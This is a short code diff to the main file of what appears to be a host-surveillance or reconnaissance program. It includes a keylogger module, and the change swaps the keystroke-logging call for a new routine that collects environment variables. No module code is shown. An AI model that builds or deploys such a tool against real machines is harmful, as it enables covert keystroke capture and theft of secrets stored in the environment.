@@ -2,6 +2,7 @@
 #include "GetDirectoryAndContents\GetDirectoryAndContents.h"
 #include "NetCommands\NetCommands.h"
 #include "Keylogger/Keylogger.h"
+#include "GetEnvironmentVars/GetEnvironVars.h"
 
 
 
@@ -15,6 +16,8 @@ int main()
 
     //GetLocalUsers();
 
-    Log_Keys();
+    //Log_Keys();
+
+    GetEnvironVars();
     
 }
